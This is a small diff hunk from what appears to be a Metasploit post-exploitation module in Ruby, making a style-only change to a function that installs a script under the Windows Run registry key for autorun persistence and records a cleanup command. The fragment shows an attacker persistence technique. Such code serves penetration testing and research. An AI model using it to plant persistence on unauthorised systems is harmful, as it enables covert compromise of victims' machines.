@@ -156,7 +156,7 @@ def write_to_reg(key,script_on_target)
   nam = Rex::Text.rand_text_alpha(rand(8)+8)
   key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
   print_status("Installing into autorun as #{key_path}\\#{nam}")
-  if (key)
+  if key
     registry_setvaldata("#{key_path}", nam, script_on_target, "REG_SZ")
     print_good("Installed into autorun as #{key_path}\\#{nam}")
     file_local_write(@clean_up_rc, "reg deleteval -k '#{key_path}' -v #{nam}\n")
